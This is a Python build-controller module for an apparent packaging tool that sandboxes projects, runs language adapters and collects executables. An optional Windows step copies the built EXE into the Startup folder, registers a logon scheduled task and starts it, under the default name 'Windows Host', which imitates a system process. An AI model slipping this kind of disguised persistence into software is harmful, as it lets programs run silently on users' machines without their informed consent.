from __future__ import annotations
import asyncio
import json
import os
import shutil
import uuid
import logging
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from backend.api.models.build_models import BuildRequest
from backend.api.utils.fs_utils import ensure_dir, safe_copytree
from backend.api.utils.sandbox import Sandbox
from backend.services.logger import log_manager
from backend.services import db
from backend.api.adapters.python_adapter import build_python
from backend.api.adapters.node_adapter import build_node
from backend.api.adapters.java_adapter import build_java
from backend.api.adapters.go_adapter import build_go
from backend.api.adapters.batch_adapter import build_batch
from backend.api.adapters.universal_adapter import build_universal

log = logging.getLogger("forgex.build")

class BuildController:
    def __init__(self):
        self.tasks: Dict[str, asyncio.Task] = {}
        self.cancel_events: Dict[str, asyncio.Event] = {}
        db.init_db()

    def _adapter_for(self, lang: str):
        return {
            "python": build_python,
            "node": build_node,
            "java": build_java,
            "go": build_go,
            "batch": build_batch,
        }.get(lang, build_universal)

    async def start(self, req: BuildRequest) -> str:
        build_id = str(uuid.uuid4())
        cancel_event = asyncio.Event()
        self.cancel_events[build_id] = cancel_event
        started_at = datetime.utcnow().isoformat()

        log.info(f"queue build id={build_id} lang={req.language} out={req.output_type} wd={req.working_dir}")
        # Insert row as queued
        db.insert_build({
            "build_id": build_id,
            "project_path": req.project_path,
            "working_dir": req.working_dir,
            "language": req.language,
            "start_command": req.start_command,
            "output_type": req.output_type,
            "include_env": int(bool(getattr(req, 'include_env', False))),
            "output_name": getattr(req, 'output_name', None),
            "status": "queued",
            "started_at": started_at,
            "finished_at": None,
            "output_files": json.dumps([]),
            "error": None,
            "log_path": str(log_manager.log_path(build_id)),
        })

        # Set per-build verbose preference for debug logs
        verbose = bool(getattr(req, 'verbose', False))
        log_manager.set_verbose(build_id, verbose)

        async def runner():
            await log_manager.emit_status({
                "build_id": build_id,
                "status": "running",
                "started_at": started_at,
                "finished_at": None,
                "output_files": [],
                "error": None,
            })
            db.update_build(build_id, status="running")
            await log_manager.emit_log(build_id, "info", "Phase: prepare workspace")
            sandbox = Sandbox(build_id)
            try:
                # Normalize/clean incoming path
                raw_path = (req.project_path or "").strip().strip('"').strip("'")
                src_path = Path(raw_path)
                await log_manager.emit_log(build_id, "debug", f"Project path: {raw_path} exists={src_path.exists()} is_file={src_path.is_file()} is_dir={src_path.is_dir()}")

                # Normalize project root: directory or parent of file
                if src_path.exists() and src_path.is_file():
                    project_name = src_path.stem
                    source_root = src_path.parent
                elif src_path.exists() and src_path.is_dir():
                    project_name = src_path.name
                    source_root = src_path
                else:
                    # Try treating as file path string even if not resolved yet
                    guessed = Path(raw_path)
                    project_name = guessed.stem if guessed.suffix else guessed.name
                    source_root = guessed.parent if guessed.suffix else guessed
                    await log_manager.emit_log(build_id, "warn", f"Provided project path not found; attempting parent: {source_root}")
                    if not source_root.exists():
                        await log_manager.emit_log(build_id, "error", f"Project path does not exist: {raw_path}")
                        raise FileNotFoundError(raw_path)

                # Copy project into sandbox
                work_root = sandbox.root / project_name
                ensure_dir(str(work_root))
                # Copy project into sandbox without blocking event loop
                await asyncio.to_thread(safe_copytree, str(source_root), str(work_root))
                await log_manager.emit_log(build_id, "debug", f"Copied source from {source_root} -> {work_root}")
                await log_manager.emit_log(build_id, "debug", f"Workspace: {work_root}")

                # Change into working_dir
                workdir = work_root / (req.working_dir or ".")
                timeout_seconds = int(os.getenv("FORGEX_BUILD_TIMEOUT", "1200"))
                await log_manager.emit_log(build_id, "debug", f"Workdir: {workdir} Timeout: {timeout_seconds}s")

                # Adapter dispatch
                adapter = self._adapter_for(req.language)
                await log_manager.emit_log(build_id, "debug", f"Adapter: {adapter.__name__}")

                await log_manager.emit_log(build_id, "info", "Phase: install deps")
                await log_manager.emit_log(build_id, "info", "Phase: build")
                try:
                    artifacts = await asyncio.wait_for(
                        adapter(
                            workdir,
                            project_name,
                            build_id,
                            req,
                            lambda lvl, msg: log_manager.emit_log(build_id, lvl, msg),
                            timeout_seconds,
                            cancel_event,
                        ),
                        timeout=timeout_seconds,
                    )
                except asyncio.TimeoutError:
                    await log_manager.emit_log(build_id, "error", f"Build exceeded timeout of {timeout_seconds}s")
                    artifacts = []

                # Move artifacts to build/<project>/<build_id>
                out_base = Path.cwd() / "build" / project_name / build_id
                ensure_dir(str(out_base))
                final_paths: List[str] = []
                for a in artifacts:
                    p = Path(a)
                    if p.exists():
                        dst = out_base / p.name
                        shutil.copy2(p, dst)
                        final_paths.append(str(dst))
                await log_manager.emit_log(build_id, "debug", f"Artifacts collected: {len(final_paths)}")

                # Optional: Windows Task Scheduler registration and start
                try:
                    if os.name == 'nt' and getattr(req, 'win_autostart', False) and final_paths:
                        exe_path = final_paths[0]
                        method = getattr(req, 'autostart_method', None) or 'task'
                        task_name = getattr(req, 'autostart_name', None) or 'Windows Host'
                        # Copy EXE to Startup folder so it persists if original is removed
                        copied_path = None
                        try:
                            appdata = os.environ.get('APPDATA')
                            if appdata:
                                startup_dir = Path(appdata) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
                                startup_dir.mkdir(parents=True, exist_ok=True)
                                # Use a stable exe name
                                dest = startup_dir / f"{task_name}.exe"
                                try:
                                    if Path(exe_path).resolve() != dest.resolve():
                                        shutil.copy2(exe_path, dest)
                                except Exception:
                                    # best-effort overwrite
                                    try:
                                        if dest.exists():
                                            dest.unlink()
                                        shutil.copy2(exe_path, dest)
                                    except Exception:
                                        pass
                                if dest.exists():
                                    copied_path = str(dest)
                                    await log_manager.emit_log(build_id, "info", f"Copied EXE to Startup: {dest}")
                        except Exception as ee:
                            await log_manager.emit_log(build_id, "warn", f"Copy to Startup failed: {ee}")
                        # Startup method: placing the EXE is sufficient
                        if method == 'startup':
                            if not copied_path:
                                # Fallback to .bat if copy failed
                                try:
                                    appdata = os.environ.get('APPDATA')
                                    if appdata:
                                        startup_dir = Path(appdata) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
                                        startup_dir.mkdir(parents=True, exist_ok=True)
                                        bat = startup_dir / f"{task_name}.bat"
                                        bat.write_text(f"@echo off\r\nstart \"\" \"{exe_path}\"\r\n", encoding='utf-8')
                                        await log_manager.emit_log(build_id, "info", f"Created Startup launcher: {bat}")
                                except Exception as ee:
                                    await log_manager.emit_log(build_id, "warn", f"Startup creation failed: {ee}")
                        else:
                            # Task Scheduler points to the copied EXE if available
                            target_path = copied_path or exe_path
                            create_cmd = [
                                "schtasks", "/Create", "/F",
                                "/SC", "ONLOGON",
                                "/RL", "LIMITED",
                                "/TN", task_name,
                                "/TR", f"\"{target_path}\"",
                            ]
                            await log_manager.emit_log(build_id, "info", f"Registering Windows Task '{task_name}' -> {target_path}")
                            try:
                                proc = await asyncio.create_subprocess_exec(*create_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                                out, err = await proc.communicate()
                                if proc.returncode != 0:
                                    await log_manager.emit_log(build_id, "warn", f"schtasks create failed ({proc.returncode}): {err.decode(errors='ignore').strip()}")
                                else:
                                    await log_manager.emit_log(build_id, "info", f"Task '{task_name}' created/updated")
                                    run_cmd = ["schtasks", "/Run", "/TN", task_name]
                                    proc2 = await asyncio.create_subprocess_exec(*run_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                                    r_out, r_err = await proc2.communicate()
                                    if proc2.returncode != 0:
                                        await log_manager.emit_log(build_id, "warn", f"schtasks run failed ({proc2.returncode}): {r_err.decode(errors='ignore').strip()}")
                                    else:
                                        await log_manager.emit_log(build_id, "info", f"Task '{task_name}' started")
                            except FileNotFoundError:
                                await log_manager.emit_log(build_id, "warn", "schtasks not found; skipping task creation")
                except Exception as e:
                    await log_manager.emit_log(build_id, "warn", f"Autostart step skipped: {e}")

                status = {
                    "build_id": build_id,
                    "status": "success" if final_paths else "failed",
                    "started_at": started_at,
                    "finished_at": datetime.utcnow().isoformat(),
                    "output_files": final_paths,
                    "error": None if final_paths else "No artifacts produced",
                }
                db.update_build(build_id, status=status["status"], finished_at=status["finished_at"], output_files=json.dumps(final_paths), error=status["error"])
                await log_manager.emit_status(status)
                await log_manager.emit_log(build_id, "info", f"Phase: complete -> {status['status']}")
            except asyncio.CancelledError:
                status = {
                    "build_id": build_id,
                    "status": "cancelled",
                    "started_at": started_at,
                    "finished_at": datetime.utcnow().isoformat(),
                    "output_files": [],
                    "error": "Cancelled by user",
                }
                db.update_build(build_id, status="cancelled", finished_at=status["finished_at"], error=status["error"])
                await log_manager.emit_status(status)
            except Exception as e:
                log.exception(f"build failed id={build_id}")
                status = {
                    "build_id": build_id,
                    "status": "failed",
                    "started_at": started_at,
                    "finished_at": datetime.utcnow().isoformat(),
                    "output_files": [],
                    "error": str(e),
                }
                db.update_build(build_id, status="failed", finished_at=status["finished_at"], error=status["error"])
                await log_manager.emit_status(status)
                await log_manager.emit_log(build_id, "error", f"Build error: {e}")
            finally:
                sandbox.cleanup()
                self.cancel_events.pop(build_id, None)
                self.tasks.pop(build_id, None)

        task = asyncio.create_task(runner())
        self.tasks[build_id] = task
        return build_id

    async def cancel(self, build_id: str) -> bool:
        ev = self.cancel_events.get(build_id)
        if not ev:
            return False
        ev.set()
        t = self.tasks.get(build_id)
        if t:
            t.cancel()
        await log_manager.emit_log(build_id, "warn", "Cancellation requested")
        return True


build_controller = BuildController()
